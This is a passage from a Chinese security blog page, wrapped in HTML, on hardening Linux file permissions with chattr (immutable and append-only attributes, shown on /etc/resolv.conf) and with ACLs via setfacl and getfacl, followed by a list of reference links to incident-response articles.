+</div><h1 id="0x11-"><a href="#0x11-" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>0x11 文件权限</h1>
+<p>一般是使用chattr或者setfacl来设置权限。</p>
+<p>chattr可以修改属性能够提高系统的安全性，但是它并不适合所有的目录。chattr命令不能保护/、/dev、/tmp、/var目录，常用参数如下：</p>
+<pre><code>a：即append，设定该参数后，只能向文件中添加数据，而不能删除，多用于服务器日志文件安全，只有root才能设定这个属性。
+
+i：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。i参数对于文件 系统的安全设置有很大帮助。
+
+s：保密性地删除文件或目录，即硬盘空间被全部收回。
+
+u：与s相反，当设定为u时，数据内容其实还存在磁盘中，可以用于undeletion。
+</code></pre><p>例子：</p>
+<p>设置/etc/resolv.conf为不可修改</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>root@vincent tmp<span class="o">]</span><span class="c1"># chattr +i /etc/resolv.conf</span>
+
+<span class="o">[</span>root@vincent tmp<span class="o">]</span><span class="c1"># lsattr /etc/resolv.conf</span>
+
+----i--------e- /etc/resolv.conf
+
+<span class="o">[</span>root@vincent tmp<span class="o">]</span><span class="c1"># echo &#34;&#34; &gt; /etc/resolv.conf</span>
+
+-bash: /etc/resolv.conf: 权限不够
+</code></pre></td></tr></table>
+</div>
+</div><p>可以使用lsattr查看文件权限</p>
+<p>setfacl其实是设置文件的访问控制列表，传统的 Linux 文件系统的权限控制是通过 user、group、other 与 r(读)、w(写)、x(执行) 的不同组合来实现的，同时存在不灵活的问题， 例如目录 /data 的权限为：drwxr-x—，所有者与所属组均为 root，在不改变所有者的前提下，要求用户 tom 对该目录有完全访问权限 (rwx).考虑以下2种办法 (这里假设 tom 不属于 root group)</p>
+<p>(1) 给 /data 的 other 类别增加 rwx permission，这样由于 tom 会被归为 other 类别，那么他也将拥有 rwx 权限。</p>
+<p>(2) 将 tom 加入到 root group，为 root group 分配 rwx 权限，那么他也将拥有 rwx 权限。</p>
+<p>以上 2 种方法其实都不合适，为了解决这些问题，Linux 开发出了一套新的文件系统权限管理方法，叫文件访问控制列表 (Access Control Lists, ACL)。简单地来说，ACL 就是可以设置特定用户或者用户组对于一个文件的操作权限。文件的所有者以及有CAP_FOWNER（在目前的linux系统上，root用户是唯一有CAP_FOWNER能力的用户）的用户进程可以设置一个文件的acl。ACL 有两种，一种是access ACL，针对文件和目录设置访问控制列表。一种是default ACL，只能针对目录设置。如果目录中的文件没有设置 ACL，它就会使用该目录的默认 ACL.</p>
+<p>getfacl获取文件权限</p>
+<p>setfacl设置Access ACL</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">setfacl -m u:root:rwx <span class="o">{</span>file<span class="o">}</span>
+<span class="c1">#取消ACL</span>
+setfacl -b <span class="o">{</span>file<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="heading"><a href="#heading" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>参考链接</h1>
+<p><a href="http://vinc.top/2017/09/20/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">http://vinc.top/2017/09/20/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%A7%BF%E5%8A%BF/</a></p>
+<p><a href="https://mp.weixin.qq.com/s/ZUJ87wWbzccw_zSRADfCVg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ZUJ87wWbzccw_zSRADfCVg</a></p>
+<p><a href="https://mp.weixin.qq.com/s/xodT25Pn3fW1xHrU0IhBDQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/xodT25Pn3fW1xHrU0IhBDQ</a></p>
+<p><a href="https://mp.weixin.qq.com/s/Z0kBcwy379x_J-Xm2Y-Vlg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Z0kBcwy379x_J-Xm2Y-Vlg</a></p>
+<p><a href="https://www.xsec.io/2018/8/31/emergency-response.html" target="_blank" rel="noopener">https://www.xsec.io/2018/8/31/emergency-response.html</a></p>
+<p><a href="https://www.freebuf.com/articles/network/186071.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/186071.html</a></p>
+<p><a href="https://github.com/iamckn/backdoors" target="_blank" rel="noopener">https://github.com/iamckn/backdoors</a></p>
+<p><a href="https://mp.weixin.qq.com/s/1I0MpWXcyJoe5zGFLnv8gw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/1I0MpWXcyJoe5zGFLnv8gw</a></p>
+<p><a href="https://mp.weixin.qq.com/s/-T9wupsSfW1Q73ocPgvMBg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/-T9wupsSfW1Q73ocPgvMBg</a></p>
+<p><a href="https://mp.weixin.qq.com/s/s0Rvlzrwx6uW_Po5AcusnQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/s0Rvlzrwx6uW_Po5AcusnQ</a></p>
+<p><a href="https://mp.weixin.qq.com/s/tu3c0l_2Bu4kNGqp3tlxKw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/tu3c0l_2Bu4kNGqp3tlxKw</a></p>
+</div>
+
+        </article>
+
+        
+
+        
+
+        
+    <div class="updated-badge-container"><div title="Updated @ 2020-01-30 13:48:00 CST" style="cursor:help;display:inline-block">
+
+<svg xmlns="http://www.w3.org/2000/svg" width="130" height="20" class="updated-badge"><linearGradient id="b" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="a"><rect width="130" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#a)"><path class="updated-badge-left" d="M0 0h55v20H0z"/><path class="updated-badge-right" d="M55 0h75v20H55z"/><path fill="url(#b)" d="M0 0h130v20H0z"/></g><g fill="#fff" text-anchor="middle" font-size="110"><text x="285" y="150" fill="#010101" fill-opacity=".3" textLength="450" transform="scale(.1)">updated</text><text x="285" y="140" textLength="450" transform="scale(.1)">updated</text><text x="915" y="150" fill="#010101" fill-opacity=".3" textLength="650" transform="scale(.1)">2020-01-30</text><text x="915" y="140" textLength="650" transform="scale(.1)">2020-01-30</text></g></svg></div></div>
+
+
+        
+
+        
+    
+    
+
+
+        
+    
+
+
+        
+    <footer class="minimal-footer">
+        
+        
+            <div class="post-category">
+                <a href="/others/" class="post-category-link active">others</a> | <a href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category-link">渗透测试</a> | <a href="/%E9%87%8D%E7%82%B9%E6%BC%8F%E6%B4%9E/" class="post-category-link">重点漏洞</a> | 
+            </div>
+        
+        
+    </footer>
+
+
+        
+
+        
+    
+        
+        
+    
+    
+    
+    
+        <ul class="post-nav">
+            
+                <li class="post-nav-prev">
+                    <a href="/others/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/" rel="prev">< 任意用户密码重置</a>
+                </li>
+            
+            
+                <li class="post-nav-next">
+                    <a href="/others/metinfos%E5%AE%9E%E6%88%98/" rel="next">MetInfos实战 ></a>
+                </li>
+            
+        </ul>
+    
+
+
+        
+
+    </div>
+</main>
+
+            
+    <div id="back-to-top" class="back-to-top">
+        <a href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a>
+    </div>
+
+            
+        </div>
+        <script src="/js/meme.min.2c1054bb9f34ffed4c73e0352b46f19d70ee6b9948af9d7d464a19117675aee4.js" integrity="sha256-LBBUu580/+1Mc+A1K0bxnXDua5lIr519RkoZEXZ1ruQ=" data-no-instant></script>
+
+
+    <script data-no-instant>InstantClick.init();</script>
+
+
+    <script data-no-instant>
+        InstantClick.on('change', function () {
+            backToTop();
+        });
+    </script>
+
+
+<script data-no-instant>
+            InstantClick.on('change', function () {
+                gtag('config', '', {
+                    'page_path': location.pathname + location.search
+                });
+            });
+        </script>
+    
+    
+    <script src="https://cdn.jsdelivr.net/gh/cferdinandi/smooth-scroll/dist/smooth-scroll.polyfills.min.js"></script>
+
+<script>
+    var scroll = new SmoothScroll('a[href*="#"]', {
+        speedAsDuration: true
+    });
+</script>
+
+
+
+
+
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@latest/dist/medium-zoom.min.js"></script>
+
+<script>
+    mediumZoom('[data-zoomable]', {
+        background: 'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'
+    })
+</script>
+
+
+
+
+
+
+
+
+
+    </body>
+</html>
